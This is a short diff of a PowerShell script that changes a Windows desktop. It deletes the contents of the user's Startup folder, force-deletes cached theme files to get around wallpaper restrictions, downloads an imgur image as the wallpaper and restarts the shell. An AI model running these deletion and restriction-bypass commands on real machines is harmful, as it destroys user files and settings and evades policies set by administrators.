@@ -6,7 +6,7 @@ Remove-Item ([Environment]::GetFolderPath('Startup') + '\*.*')
 Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize -Name AppsUseLightTheme -Value 0
 
 # Bypass wallpaper restrictions
-Remove-Item ($env:APPDATA + '\Microsoft\Windows\Themes\*') 
+Remove-Item -Recurse -Force ($env:APPDATA + '\Microsoft\Windows\Themes\*') 
 Invoke-WebRequest -Uri "https://i.imgur.com/RzQqHgo.jpeg" -OutFile ($env:APPDATA + '\Microsoft\Windows\Themes\TranscodedWallpaper') 
 
 # Restart desktop shell
